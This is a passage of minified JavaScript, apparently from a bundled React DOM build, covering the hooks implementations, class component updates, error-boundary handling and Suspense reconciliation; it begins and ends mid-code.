yt={lane:0,revertLane:Q.revertLane,gesture:null,action:Q.action,hasEagerState:Q.hasEagerState,eagerState:Q.eagerState,next:null},I===null?(R=I=yt,g=u):I=I.next=yt,he.lanes|=Z,tr|=Z;yt=Q.action,Lr&&a(u,yt),u=Q.hasEagerState?Q.eagerState:a(u,yt)}else Z={lane:yt,revertLane:Q.revertLane,gesture:Q.gesture,action:Q.action,hasEagerState:Q.hasEagerState,eagerState:Q.eagerState,next:null},I===null?(R=I=Z,g=u):I=I.next=Z,he.lanes|=yt,tr|=yt;Q=Q.next}while(Q!==null&&Q!==n);if(I===null?g=u:I.next=R,!ii(u,t.memoizedState)&&(pn=!0,ct&&(a=hs,a!==null)))throw a;t.memoizedState=u,t.baseState=g,t.baseQueue=I,r.lastRenderedState=u}return l===null&&(r.lanes=0),[t.memoizedState,r.dispatch]}function Ff(t){var n=un(),a=n.queue;if(a===null)throw Error(s(311));a.lastRenderedReducer=t;var r=a.dispatch,l=a.pending,u=n.memoizedState;if(l!==null){a.pending=null;var g=l=l.next;do u=t(u,g.action),g=g.next;while(g!==l);ii(u,n.memoizedState)||(pn=!0),n.memoizedState=u,n.baseQueue===null&&(n.baseState=u),a.lastRenderedState=u}return[u,r]}function g0(t,n,a){var r=he,l=un(),u=xe;if(u){if(a===void 0)throw Error(s(407));a=a()}else a=n();var g=!ii((Ze||l).memoizedState,a);if(g&&(l.memoizedState=a,pn=!0),l=l.queue,Vf(x0.bind(null,r,l,t),[t]),t=l.getSnapshot!==n||g||hn!==null&&(hn.memoizedState.tag&1)!==0,vs(t?9:8,{destroy:void 0},v0.bind(null,r,l,a,n),null),t){if(r.flags|=2048,Ke===null)throw Error(s(349));u||(va&127)!==0||_0(r,n,a)}return a}function _0(t,n,a){t.flags|=16384,t={getSnapshot:n,value:a},n=he.updateQueue,n===null?(n=nc(),he.updateQueue=n,n.stores=[t]):(a=n.stores,a===null?n.stores=[t]:a.push(t))}function v0(t,n,a,r){n.value=a,n.getSnapshot=r,S0(n)&&y0(t)}function x0(t,n,a){return a(function(){S0(n)&&y0(t)})}function S0(t){var n=t.getSnapshot;t=t.value;try{var a=n();return!ii(t,a)}catch{return!0}}function y0(t){var n=Mr(t,2);n!==null&&jn(n,t,2)}function Hf(t){var n=Fn();if(typeof t=="function"){var a=t;if(t=a(),Lr){Re(!0);try{a()}finally{Re(!1)}}}return n.memoizedState=n.baseState=t,n.queue={pending:null,lanes:0,dispatch:null,lastRenderedReducer:xa,lastRenderedState:t},n}function M0(t,n,a,r){return t.baseState=a,Bf(t,Ze,typeof r=="function"?r:xa)}function Ty(t,n,a,r,l){if(oc(t))throw Error(s(485));if(t=n.action,t!==null){var u={payload:l,action:t,next:null,isTransition:!0,status:"pending",value:null,reason:null,listeners:[],then:function(g){u.listeners.push(g)}};_t.T!==null?a(!0):u.isTransition=!1,r(u),a=n.pending,a===null?(u.next=n.pending=u,E0(n,u)):(u.next=a.next,n.pending=a.next=u)}}function E0(t,n){var a=n.action,r=n.payload,l=t.state;if(n.isTransition){var u=_t.T,g={};g.types=u!==null?u.types:null,_t.T=g;try{var R=a(l,r),I=_t.S;I!==null&&I(g,R),b0(t,n,R)}catch(Q){Gf(t,n,Q)}finally{u!==null&&g.types!==null&&(u.types=g.types),_t.T=u}}else try{u=a(l,r),b0(t,n,u)}catch(Q){Gf(t,n,Q)}}function b0(t,n,a){a!==null&&typeof a=="object"&&typeof a.then=="function"?a.then(function(r){T0(t,n,r)},function(r){return Gf(t,n,r)}):T0(t,n,a)}function T0(t,n,a){n.status="fulfilled",n.value=a,A0(n),t.state=a,n=t.pending,n!==null&&(a=n.next,a===n?t.pending=null:(a=a.next,n.next=a,E0(t,a)))}function Gf(t,n,a){var r=t.pending;if(t.pending=null,r!==null){r=r.next;do n.status="rejected",n.reason=a,A0(n),n=n.next;while(n!==r)}t.action=null}function A0(t){t=t.listeners;for(var n=0;n<t.length;n++)(0,t[n])()}function R0(t,n){return n}function C0(t,n){if(xe){var a=Ke.formState;if(a!==null){t:{var r=he;if(xe){if(Qe){e:{for(var l=Qe,u=xi;l.nodeType!==8;){if(!u){l=null;break e}if(l=yi(l.nextSibling),l===null){l=null;break e}}u=l.data,l=u==="F!"||u==="F"?l:null}if(l){Qe=yi(l.nextSibling),r=l.data==="F!";break t}}Va(r)}r=!1}r&&(n=a[0])}}return a=Fn(),a.memoizedState=a.baseState=n,r={pending:null,lanes:0,dispatch:null,lastRenderedReducer:R0,lastRenderedState:n},a.queue=r,a=Y0.bind(null,he,r),r.dispatch=a,r=Hf(!1),u=Yf.bind(null,he,!1,r.queue),r=Fn(),l={state:n,dispatch:null,action:t,pending:null},r.queue=l,a=Ty.bind(null,he,l,u,a),l.dispatch=a,r.memoizedState=t,[n,a,!1]}function w0(t){var n=un();return N0(n,Ze,t)}function N0(t,n,a){if(n=Bf(t,n,R0)[0],t=ac(xa)[0],typeof n=="object"&&n!==null&&typeof n.then=="function")try{var r=Po(n)}catch(g){throw g===ps?Zl:g}else r=n;n=un();var l=n.queue,u=l.dispatch;return a!==n.memoizedState&&(he.flags|=2048,vs(9,{destroy:void 0},Ay.bind(null,l,a),null)),[r,u,t]}function Ay(t,n){t.action=n}function D0(t){var n=un(),a=Ze;if(a!==null)return N0(n,a,t);un(),n=n.memoizedState,a=un();var r=a.queue.dispatch;return a.memoizedState=t,[n,r,!1]}function vs(t,n,a,r){return t={tag:t,create:a,deps:r,inst:n,next:null},n=he.updateQueue,n===null&&(n=nc(),he.updateQueue=n),a=n.lastEffect,a===null?n.lastEffect=t.next=t:(r=a.next,a.next=t,t.next=r,n.lastEffect=t),t}function U0(){return un().memoizedState}function rc(t,n,a,r){var l=Fn();he.flags|=t,l.memoizedState=vs(1|n,{destroy:void 0},a,r===void 0?null:r)}function sc(t,n,a,r){var l=un();r=r===void 0?null:r;var u=l.memoizedState.inst;Ze!==null&&r!==null&&Uf(r,Ze.memoizedState.deps)?l.memoizedState=vs(n,u,a,r):(he.flags|=t,l.memoizedState=vs(1|n,u,a,r))}function L0(t,n){rc(8390656,8,t,n)}function Vf(t,n){sc(2048,8,t,n)}function Ry(t){he.flags|=4;var n=he.updateQueue;if(n===null)n=nc(),he.updateQueue=n,n.events=[t];else{var a=n.events;a===null?n.events=[t]:a.push(t)}}function O0(t){var n=un().memoizedState;return Ry({ref:n,nextImpl:t}),function(){if((Fe&2)!==0)throw Error(s(440));return n.impl.apply(void 0,arguments)}}function P0(t,n){return sc(4,2,t,n)}function I0(t,n){return sc(4,4,t,n)}function z0(t,n){if(typeof n=="function"){t=t();var a=n(t);return function(){typeof a=="function"?a():n(null)}}if(n!=null)return t=t(),n.current=t,function(){n.current=null}}function B0(t,n,a){a=a!=null?a.concat([t]):null,sc(4,4,z0.bind(null,n,t),a)}function Xf(){}function F0(t,n){var a=un();n=n===void 0?null:n;var r=a.memoizedState;return n!==null&&Uf(n,r[1])?r[0]:(a.memoizedState=[t,n],t)}function H0(t,n){var a=un();n=n===void 0?null:n;var r=a.memoizedState;if(n!==null&&Uf(n,r[1]))return r[0];if(r=t(),Lr){Re(!0);try{t()}finally{Re(!1)}}return a.memoizedState=[r,n],r}function kf(t,n,a){return a===void 0||(va&1073741824)!==0&&(Te&261930)===0?t.memoizedState=n:(t.memoizedState=a,t=jg(),he.lanes|=t,tr|=t,a)}function G0(t,n,a,r){return ii(a,n)?a:Za.current!==null?(t=kf(t,a,r),ii(t,n)||(pn=!0),t):(va&106)===0||(va&1073741824)!==0&&(Te&261930)===0?(pn=!0,t.memoizedState=a):(t=jg(),he.lanes|=t,tr|=t,n)}function V0(t,n,a,r,l){var u=Rt.p;Rt.p=u!==0&&8>u?u:8;var g=_t.T,R={};R.types=g!==null?g.types:null,_t.T=R,Yf(t,!1,n,a);try{var I=l(),Q=_t.S;if(Q!==null&&Q(R,I),I!==null&&typeof I=="object"&&typeof I.then=="function"){var ct=My(I,r);Io(t,n,ct,li(t))}else Io(t,n,r,li(t))}catch(yt){Io(t,n,{then:function(){},status:"rejected",reason:yt},li())}finally{Rt.p=u,g!==null&&R.types!==null&&(g.types=R.types),_t.T=g}}function Cy(){}function Wf(t,n,a,r){if(t.tag!==5)throw Error(s(476));var l=X0(t).queue;V0(t,l,n,Le,a===null?Cy:function(){return k0(t),a(r)})}function X0(t){var n=t.memoizedState;if(n!==null)return n;n={memoizedState:Le,baseState:Le,baseQueue:null,queue:{pending:null,lanes:0,dispatch:null,lastRenderedReducer:xa,lastRenderedState:Le},next:null};var a={};return n.next={memoizedState:a,baseState:a,baseQueue:null,queue:{pending:null,lanes:0,dispatch:null,lastRenderedReducer:xa,lastRenderedState:a},next:null},t.memoizedState=n,t=t.alternate,t!==null&&(t.memoizedState=n),n}function k0(t){var n=X0(t);n.next===null&&(n=t.alternate.memoizedState),Io(t,n.next.queue,{},li())}function qf(){return An(zs)}function W0(){return un().memoizedState}function q0(){return un().memoizedState}function wy(t){for(var n=t.return;n!==null;){switch(n.tag){case 24:case 3:var a=li();t=qa(a);var r=Ya(n,t,a);r!==null&&(jn(r,n,a),No(r,n,a)),n={cache:Sf()},t.payload=n;return}n=n.return}}function Ny(t,n,a){var r=li();a={lane:r,revertLane:0,gesture:null,action:a,hasEagerState:!1,eagerState:null,next:null},oc(t)?Z0(n,a):(a=ff(t,n,a,r),a!==null&&(jn(a,t,r),K0(a,n,r)))}function Y0(t,n,a){var r=li();Io(t,n,a,r)}function Io(t,n,a,r){var l={lane:r,revertLane:0,gesture:null,action:a,hasEagerState:!1,eagerState:null,next:null};if(oc(t))Z0(n,l);else{var u=t.alternate;if(t.lanes===0&&(u===null||u.lanes===0)&&(u=n.lastRenderedReducer,u!==null))try{var g=n.lastRenderedState,R=u(g,a);if(l.hasEagerState=!0,l.eagerState=R,ii(R,g))return Bl(t,n,l,0),Ke===null&&zl(),!1}catch{}finally{}if(a=ff(t,n,l,r),a!==null)return jn(a,t,r),K0(a,n,r),!0}return!1}function Yf(t,n,a,r){if(r={lane:2,revertLane:zd(),gesture:null,action:r,hasEagerState:!1,eagerState:null,next:null},oc(t)){if(n)throw Error(s(479))}else n=ff(t,a,r,2),n!==null&&jn(n,t,2)}function oc(t){var n=t.alternate;return t===he||n!==null&&n===he}function Z0(t,n){gs=tc=!0;var a=t.pending;a===null?n.next=n:(n.next=a.next,a.next=n),t.pending=n}function K0(t,n,a){if((a&4194048)!==0){var r=n.lanes;r&=t.pendingLanes,a|=r,n.lanes=a,uo(t,a)}}var lc={readContext:An,use:ic,useCallback:sn,useContext:sn,useEffect:sn,useImperativeHandle:sn,useLayoutEffect:sn,useInsertionEffect:sn,useMemo:sn,useReducer:sn,useRef:sn,useState:sn,useDebugValue:sn,useDeferredValue:sn,useTransition:sn,useSyncExternalStore:sn,useId:sn,useHostTransitionStatus:sn,useFormState:sn,useActionState:sn,useOptimistic:sn,useMemoCache:sn,useCacheRefresh:sn,useEffectEvent:sn},j0={readContext:An,use:ic,useCallback:function(t,n){return Fn().memoizedState=[t,n===void 0?null:n],t},useContext:An,useEffect:L0,useImperativeHandle:function(t,n,a){a=a!=null?a.concat([t]):null,rc(4194308,4,z0.bind(null,n,t),a)},useLayoutEffect:function(t,n){return rc(4194308,4,t,n)},useInsertionEffect:function(t,n){rc(4,2,t,n)},useMemo:function(t,n){var a=Fn();n=n===void 0?null:n;var r=t();if(Lr){Re(!0);try{t()}finally{Re(!1)}}return a.memoizedState=[r,n],r},useReducer:function(t,n,a){var r=Fn();if(a!==void 0){var l=a(n);if(Lr){Re(!0);try{a(n)}finally{Re(!1)}}}else l=n;return r.memoizedState=r.baseState=l,t={pending:null,lanes:0,dispatch:null,lastRenderedReducer:t,lastRenderedState:l},r.queue=t,t=t.dispatch=Ny.bind(null,he,t),[r.memoizedState,t]},useRef:function(t){var n=Fn();return t={current:t},n.memoizedState=t},useState:function(t){t=Hf(t);var n=t.queue,a=Y0.bind(null,he,n);return n.dispatch=a,[t.memoizedState,a]},useDebugValue:Xf,useDeferredValue:function(t,n){var a=Fn();return kf(a,t,n)},useTransition:function(){var t=Hf(!1);return t=V0.bind(null,he,t.queue,!0,!1),Fn().memoizedState=t,[!1,t]},useSyncExternalStore:function(t,n,a){var r=he,l=Fn();if(xe){if(a===void 0)throw Error(s(407));a=a()}else{if(a=n(),Ke===null)throw Error(s(349));(Te&127)!==0||_0(r,n,a)}l.memoizedState=a;var u={value:a,getSnapshot:n};return l.queue=u,L0(x0.bind(null,r,u,t),[t]),r.flags|=2048,vs(9,{destroy:void 0},v0.bind(null,r,u,a,n),null),a},useId:function(){var t=Fn(),n=Ke.identifierPrefix;if(xe){var a=Wi,r=ki;a=(r&~(1<<32-ue(r)-1)).toString(32)+a,n="_"+n+"R_"+a,a=ec++,0<a&&(n+="H"+a.toString(32)),n+="_"}else a=Ey++,n="_"+n+"r_"+a.toString(32)+"_";return t.memoizedState=n},useHostTransitionStatus:qf,useFormState:C0,useActionState:C0,useOptimistic:function(t){var n=Fn();n.memoizedState=n.baseState=t;var a={pending:null,lanes:0,dispatch:null,lastRenderedReducer:null,lastRenderedState:null};return n.queue=a,n=Yf.bind(null,he,!0,a),a.dispatch=n,[t,n]},useMemoCache:zf,useCacheRefresh:function(){return Fn().memoizedState=wy.bind(null,he)},useEffectEvent:function(t){var n=Fn(),a={impl:t};return n.memoizedState=a,function(){if((Fe&2)!==0)throw Error(s(440));return a.impl.apply(void 0,arguments)}}},Q0={readContext:An,use:ic,useCallback:F0,useContext:An,useEffect:Vf,useImperativeHandle:B0,useInsertionEffect:P0,useLayoutEffect:I0,useMemo:H0,useReducer:ac,useRef:U0,useState:function(){return ac(xa)},useDebugValue:Xf,useDeferredValue:function(t,n){var a=un();return G0(a,Ze.memoizedState,t,n)},useTransition:function(){var t=ac(xa)[0],n=un().memoizedState;return[typeof t=="boolean"?t:Po(t),n]},useSyncExternalStore:g0,useId:W0,useHostTransitionStatus:qf,useFormState:w0,useActionState:w0,useOptimistic:function(t,n){var a=un();return M0(a,Ze,t,n)},useMemoCache:zf,useCacheRefresh:q0,useEffectEvent:O0},Dy={readContext:An,use:ic,useCallback:F0,useContext:An,useEffect:Vf,useImperativeHandle:B0,useInsertionEffect:P0,useLayoutEffect:I0,useMemo:H0,useReducer:Ff,useRef:U0,useState:function(){return Ff(xa)},useDebugValue:Xf,useDeferredValue:function(t,n){var a=un();return Ze===null?kf(a,t,n):G0(a,Ze.memoizedState,t,n)},useTransition:function(){var t=Ff(xa)[0],n=un().memoizedState;return[typeof t=="boolean"?t:Po(t),n]},useSyncExternalStore:g0,useId:W0,useHostTransitionStatus:qf,useFormState:D0,useActionState:D0,useOptimistic:function(t,n){var a=un();return Ze!==null?M0(a,Ze,t,n):(a.baseState=t,[t,a.queue.dispatch])},useMemoCache:zf,useCacheRefresh:q0,useEffectEvent:O0};function Zf(t,n,a,r){n=t.memoizedState,a=a(r,n),a=a==null?n:P({},n,a),t.memoizedState=a,t.lanes===0&&(t.updateQueue.baseState=a)}var Kf={enqueueSetState:function(t,n,a){t=t._reactInternals;var r=li(),l=qa(r);l.payload=n,a!=null&&(l.callback=a),n=Ya(t,l,r),n!==null&&(jn(n,t,r),No(n,t,r))},enqueueReplaceState:function(t,n,a){t=t._reactInternals;var r=li(),l=qa(r);l.tag=1,l.payload=n,a!=null&&(l.callback=a),n=Ya(t,l,r),n!==null&&(jn(n,t,r),No(n,t,r))},enqueueForceUpdate:function(t,n){t=t._reactInternals;var a=li(),r=qa(a);r.tag=2,n!=null&&(r.callback=n),n=Ya(t,r,a),n!==null&&(jn(n,t,a),No(n,t,a))}};function J0(t,n,a,r,l,u,g){return t=t.stateNode,typeof t.shouldComponentUpdate=="function"?t.shouldComponentUpdate(r,u,g):n.prototype&&n.prototype.isPureReactComponent?!Mo(a,r)||!Mo(l,u):!0}function $0(t,n,a,r){t=n.state,typeof n.componentWillReceiveProps=="function"&&n.componentWillReceiveProps(a,r),typeof n.UNSAFE_componentWillReceiveProps=="function"&&n.UNSAFE_componentWillReceiveProps(a,r),n.state!==t&&Kf.enqueueReplaceState(n,n.state,null)}function Or(t,n){var a=n;if("ref"in n){a={};for(var r in n)r!=="ref"&&(a[r]=n[r])}if(t=t.defaultProps){a===n&&(a=P({},a));for(var l in t)a[l]===void 0&&(a[l]=t[l])}return a}function tg(t){Il(t)}function eg(t){console.error(t)}function ng(t){Il(t)}function cc(t,n){try{var a=t.onUncaughtError;a(n.value,{componentStack:n.stack})}catch(r){setTimeout(function(){throw r})}}function ig(t,n,a){try{var r=t.onCaughtError;r(a.value,{componentStack:a.stack,errorBoundary:n.tag===1?n.stateNode:null})}catch(l){setTimeout(function(){throw l})}}function jf(t,n,a){return a=qa(a),a.tag=3,a.payload={element:null},a.callback=function(){cc(t,n)},a}function ag(t){return t=qa(t),t.tag=3,t}function rg(t,n,a,r){var l=a.type.getDerivedStateFromError;if(typeof l=="function"){var u=r.value;t.payload=function(){return l(u)},t.callback=function(){ig(n,a,r)}}var g=a.stateNode;g!==null&&typeof g.componentDidCatch=="function"&&(t.callback=function(){ig(n,a,r),typeof l!="function"&&(er===null?er=new Set([this]):er.add(this));var R=r.stack;this.componentDidCatch(r.value,{componentStack:R!==null?R:""})})}function Uy(t,n,a,r,l){if(a.flags|=32768,r!==null&&typeof r=="object"&&typeof r.then=="function"){if(n=a.alternate,n!==null&&Ar(n,a,l,!0),a=Rn.current,a!==null){switch(a.tag){case 31:case 13:case 19:return Ln===null?Nc():a.alternate===null&&on===0&&(on=3),a.flags&=-257,a.flags|=65536,a.lanes=l,r===Kl?a.flags|=16384:(n=a.updateQueue,n===null?a.updateQueue=new Set([r]):n.add(r),Od(t,r,l)),!1;case 22:return a.flags|=65536,r===Kl?a.flags|=16384:(n=a.updateQueue,n===null?(n={transitions:null,markerInstances:null,retryQueue:new Set([r])},a.updateQueue=n):(a=n.retryQueue,a===null?n.retryQueue=new Set([r]):a.add(r)),Od(t,r,l)),!1}throw Error(s(435,a.tag))}return Od(t,r,l),Nc(),!1}if(xe)return n=Rn.current,n!==null?((n.flags&65536)===0&&(n.flags|=256),n.flags|=65536,n.lanes=l,r!==gf&&(t=Error(s(422),{cause:r}),To(gi(t,a)))):(r!==gf&&(n=Error(s(423),{cause:r}),To(gi(n,a))),t=t.current.alternate,t.flags|=65536,l&=-l,t.lanes|=l,r=gi(r,a),l=jf(t.stateNode,r,l),Af(t,l),on!==4&&(on=2)),!1;var u=Error(s(520),{cause:r});if(u=gi(u,a),ko===null?ko=[u]:ko.push(u),on!==4&&(on=2),n===null)return!0;r=gi(r,a),a=n;do{switch(a.tag){case 3:return a.flags|=65536,t=l&-l,a.lanes|=t,t=jf(a.stateNode,r,t),Af(a,t),!1;case 1:if(n=a.type,u=a.stateNode,(a.flags&128)===0&&(typeof n.getDerivedStateFromError=="function"||u!==null&&typeof u.componentDidCatch=="function"&&(er===null||!er.has(u))))return a.flags|=65536,l&=-l,a.lanes|=l,l=ag(l),rg(l,t,a,r),Af(a,l),!1;break;case 22:if(a.memoizedState!==null)return a.flags|=65536,!1}a=a.return}while(a!==null);return!1}var Qf=Error(s(461)),pn=!1;function xn(t,n,a,r){n.child=t===null?c0(n,null,a,r):Ur(n,t.child,a,r)}function sg(t,n,a,r,l){a=a.render;var u=n.ref;if("ref"in r){var g={};for(var R in r)R!=="ref"&&(g[R]=r[R])}else g=r;return Rr(n),r=Lf(t,n,a,g,u,l),R=Of(),t!==null&&!pn?(Pf(t,n,l),Sa(t,n,l)):(xe&&R&&Vl(n),n.flags|=1,xn(t,n,r,l),n.child)}function og(t,n,a,r,l){if(t===null){var u=a.type;return typeof u=="function"&&!df(u)&&u.defaultProps===void 0&&a.compare===null?(n.tag=15,n.type=u,lg(t,n,u,r,l)):(t=Hl(a.type,null,r,n,n.mode,l),t.ref=n.ref,t.return=n,n.child=t)}if(u=t.child,!rd(t,l)){var g=u.memoizedProps;if(a=a.compare,a=a!==null?a:Mo,a(g,r)&&t.ref===n.ref)return Sa(t,n,l)}return n.flags|=1,t=pa(u,r),t.ref=n.ref,t.return=n,n.child=t}function lg(t,n,a,r,l){if(t!==null){var u=t.memoizedProps;if(Mo(u,r)&&t.ref===n.ref)if(pn=!1,n.pendingProps=r=u,rd(t,l))(t.flags&131072)!==0&&(pn=!0);else return n.lanes=t.lanes,Sa(t,n,l)}return Jf(t,n,a,r,l)}function cg(t,n,a,r){var l=r.children,u=t!==null?t.memoizedState:null;if(t===null&&n.stateNode===null&&(n.stateNode={_visibility:1,_pendingMarkers:null,_retryCache:null,_transitions:null}),r.mode==="hidden"){if((n.flags&128)!==0){if(u=u!==null?u.baseLanes|a:a,t!==null){for(r=n.child=t.child,l=0;r!==null;)l=l|r.lanes|r.childLanes,r=r.sibling;r=l&~u}else r=0,n.child=null;return ug(t,n,u,a,r)}if((a&536870912)!==0)n.memoizedState={baseLanes:0,cachePool:null},t!==null&&Yl(n,u!==null?u.cachePool:null),u!==null?d0(n,u):Cf(),h0(n);else return r=n.lanes=536870912,ug(t,n,u!==null?u.baseLanes|a:a,a,r)}else u!==null?(Yl(n,u.cachePool),d0(n,u),ja(),n.memoizedState=null):(t!==null&&Yl(n,null),Cf(),ja());return xn(t,n,l,a),n.child}function zo(t,n){return t!==null&&t.tag===22||n.stateNode!==null||(n.stateNode={_visibility:1,_pendingMarkers:null,_retryCache:null,_transitions:null}),n.sibling}function ug(t,n,a,r,l){var u=Mf();return u=u===null?null:{parent:dn._currentValue,pool:u},n.memoizedState={baseLanes:a,cachePool:u},t!==null&&Yl(n,null),Cf(),h0(n),t!==null&&Ar(t,n,r,!0),n.childLanes=l,null}function uc(t,n){return n=fc({mode:n.mode,children:n.children},t.mode),n.ref=t.ref,t.child=n,n.return=t,n}function fg(t,n,a){return Ur(n,t.child,null,a),t=uc(n,n.pendingProps),t.flags|=2,ai(n),n.memoizedState=null,t}function Ly(t,n,a){var r=n.pendingProps,l=(n.flags&128)!==0;if(n.flags&=-129,t===null){if(xe){if(r.mode==="hidden")return t=uc(n,r),n.lanes=536870912,t.memoizedState={baseLanes:0,cachePool:null},zo(null,t);if(Nf(n),(t=Qe)?(t=z_(t,xi),t=t!==null&&t.data==="&"?t:null,t!==null&&(n.memoizedState={dehydrated:t,treeContext:Ha!==null?{id:ki,overflow:Wi}:null,retryLane:536870912,hydrationErrors:null},a=Zm(t),a.return=n,n.child=a,Mn=n,Qe=null)):t=null,t===null)throw Va(n);return n.lanes=536870912,null}return uc(n,r)}var u=t.memoizedState;if(u!==null){var g=u.dehydrated;if(Nf(n),l)if(n.flags&256)n.flags&=-257,n=fg(t,n,a);else if(n.memoizedState!==null)n.child=t.child,n.flags|=128,n=null;else throw Error(s(558));else if(pn||Ar(t,n,a,!1),l=(a&t.childLanes)!==0,pn||l){if(Za.current===null){if(r=Ke,r!==null&&(g=fo(r,a),g!==0&&g!==u.retryLane))throw u.retryLane=g,Mr(t,g),jn(r,t,g),Qf;Nc()}n=fg(t,n,a)}else t=u.treeContext,Qe=yi(g.nextSibling),Mn=n,xe=!0,Ga=null,xi=!1,t!==null&&Qm(n,t),n=uc(n,r),n.flags|=134221824;return n}return t=pa(t.child,{mode:r.mode,children:r.children}),t.ref=n.ref,n.child=t,t.return=n,t}function xs(t,n){var a=n.ref;if(a===null)t!==null&&t.ref!==null&&(n.flags|=4194816);else{if(typeof a!="function"&&typeof a!="object")throw Error(s(284));(t===null||t.ref!==a)&&(n.flags|=4194816)}}function Jf(t,n,a,r,l){return Rr(n),a=Lf(t,n,a,r,void 0,l),r=Of(),t!==null&&!pn?(Pf(t,n,l),Sa(t,n,l)):(xe&&r&&Vl(n),n.flags|=1,xn(t,n,a,l),n.child)}function dg(t,n,a,r,l,u){return Rr(n),n.updateQueue=null,a=m0(n,r,a,l),p0(t),r=Of(),t!==null&&!pn?(Pf(t,n,u),Sa(t,n,u)):(xe&&r&&Vl(n),n.flags|=1,xn(t,n,a,u),n.child)}function hg(t,n,a,r,l){if(Rr(n),n.stateNode===null){var u=cs,g=a.contextType;typeof g=="object"&&g!==null&&(u=An(g)),u=new a(r,u),n.memoizedState=u.state!==null&&u.state!==void 0?u.state:null,u.updater=Kf,n.stateNode=u,u._reactInternals=n,u=n.stateNode,u.props=r,u.state=n.memoizedState,u.refs={},bf(n),g=a.contextType,u.context=typeof g=="object"&&g!==null?An(g):cs,u.state=n.memoizedState,g=a.getDerivedStateFromProps,typeof g=="function"&&(Zf(n,a,g,r),u.state=n.memoizedState),typeof a.getDerivedStateFromProps=="function"||typeof u.getSnapshotBeforeUpdate=="function"||typeof u.UNSAFE_componentWillMount!="function"&&typeof u.componentWillMount!="function"||(g=u.state,typeof u.componentWillMount=="function"&&u.componentWillMount(),typeof u.UNSAFE_componentWillMount=="function"&&u.UNSAFE_componentWillMount(),g!==u.state&&Kf.enqueueReplaceState(u,u.state,null),Uo(n,r,u,l),Do(),u.state=n.memoizedState),typeof u.componentDidMount=="function"&&(n.flags|=4194308),r=!0}else if(t===null){u=n.stateNode;var R=n.memoizedProps,I=Or(a,R);u.props=I;var Q=u.context,ct=a.contextType;g=cs,typeof ct=="object"&&ct!==null&&(g=An(ct));var yt=a.getDerivedStateFromProps;ct=typeof yt=="function"||typeof u.getSnapshotBeforeUpdate=="function",R=n.pendingProps!==R,ct||typeof u.UNSAFE_componentWillReceiveProps!="function"&&typeof u.componentWillReceiveProps!="function"||(R||Q!==g)&&$0(n,u,r,g),Wa=!1;var Z=n.memoizedState;u.state=Z,Uo(n,r,u,l),Do(),Q=n.memoizedState,R||Z!==Q||Wa?(typeof yt=="function"&&(Zf(n,a,yt,r),Q=n.memoizedState),(I=Wa||J0(n,a,I,r,Z,Q,g))?(ct||typeof u.UNSAFE_componentWillMount!="function"&&typeof u.componentWillMount!="function"||(typeof u.componentWillMount=="function"&&u.componentWillMount(),typeof u.UNSAFE_componentWillMount=="function"&&u.UNSAFE_componentWillMount()),typeof u.componentDidMount=="function"&&(n.flags|=4194308)):(typeof u.componentDidMount=="function"&&(n.flags|=4194308),n.memoizedProps=r,n.memoizedState=Q),u.props=r,u.state=Q,u.context=g,r=I):(typeof u.componentDidMount=="function"&&(n.flags|=4194308),r=!1)}else{u=n.stateNode,Tf(t,n),g=n.memoizedProps,ct=Or(a,g),u.props=ct,yt=n.pendingProps,Z=u.context,Q=a.contextType,I=cs,typeof Q=="object"&&Q!==null&&(I=An(Q)),R=a.getDerivedStateFromProps,(Q=typeof R=="function"||typeof u.getSnapshotBeforeUpdate=="function")||typeof u.UNSAFE_componentWillReceiveProps!="function"&&typeof u.componentWillReceiveProps!="function"||(g!==yt||Z!==I)&&$0(n,u,r,I),Wa=!1,Z=n.memoizedState,u.state=Z,Uo(n,r,u,l),Do();var st=n.memoizedState;g!==yt||Z!==st||Wa||t!==null&&t.dependencies!==null&&Wl(t.dependencies)?(typeof R=="function"&&(Zf(n,a,R,r),st=n.memoizedState),(ct=Wa||J0(n,a,ct,r,Z,st,I)||t!==null&&t.dependencies!==null&&Wl(t.dependencies))?(Q||typeof u.UNSAFE_componentWillUpdate!="function"&&typeof u.componentWillUpdate!="function"||(typeof u.componentWillUpdate=="function"&&u.componentWillUpdate(r,st,I),typeof u.UNSAFE_componentWillUpdate=="function"&&u.UNSAFE_componentWillUpdate(r,st,I)),typeof u.componentDidUpdate=="function"&&(n.flags|=4),typeof u.getSnapshotBeforeUpdate=="function"&&(n.flags|=1024)):(typeof u.componentDidUpdate!="function"||g===t.memoizedProps&&Z===t.memoizedState||(n.flags|=4),typeof u.getSnapshotBeforeUpdate!="function"||g===t.memoizedProps&&Z===t.memoizedState||(n.flags|=1024),n.memoizedProps=r,n.memoizedState=st),u.props=r,u.state=st,u.context=I,r=ct):(typeof u.componentDidUpdate!="function"||g===t.memoizedProps&&Z===t.memoizedState||(n.flags|=4),typeof u.getSnapshotBeforeUpdate!="function"||g===t.memoizedProps&&Z===t.memoizedState||(n.flags|=1024),r=!1)}return u=r,xs(t,n),r=(n.flags&128)!==0,u||r?(u=n.stateNode,a=r&&typeof a.getDerivedStateFromError!="function"?null:u.render(),n.flags|=1,t!==null&&r?(n.child=Ur(n,t.child,null,l),n.child=Ur(n,null,a,l)):xn(t,n,a,l),n.memoizedState=u.state,t=n.child):t=Sa(t,n,l),t}function pg(t,n,a,r){return br(),n.flags|=256,xn(t,n,a,r),n.child}var $f={dehydrated:null,treeContext:null,retryLane:0,hydrationErrors:null};function td(t){return{baseLanes:t,cachePool:i0()}}function ed(t,n,a){return t=t!==null?t.childLanes&~a:0,n&&(t|=oi),t}function mg(t,n,a){var r=n.pendingProps,l=!1,u=(n.flags&128)!==0,g;if((g=u)||(g=t!==null&&t.memoizedState===null?!1:(Cn.current&2)!==0),g&&(l=!0,n.flags&=-129),g=(n.flags&32)!==0,n.flags&=-33,t===null){if(xe){if(l?Ka(n):ja(),(t=Qe)?(t=z_(t,xi),t=t!==null&&t.data!=="&"?t:null,t!==null&&(n.memoizedState={dehydrated:t,treeContext:Ha!==null?{id:ki,overflow:Wi}:null,retryLane:536870912,hydrationErrors:null},a=Zm(t),a.return=n,n.child=a,Mn=n,Qe=null)):t=null,t===null)throw Va(n);return th(t)?n.lanes=32:n.lanes=536870912,null}return u=r.children,r=r.fallback,l?(ja(),l=n.mode,u=fc({mode:"hidden",children:u},l),r=Er(r,l,a,null),u.return=n,r.return=n,u.sibling=r,n.child=u,r=n.child,r.memoizedState=td(a),r.childLanes=ed(t,g,a),n.memoizedState=$f,zo(null,r)):(Ka(n),nd(n,u))}var R=t.memoizedState;if(R!==null){var I=R.dehydrated;if(I!==null)return Oy(t,n,u,g,r,I,R,a)}return 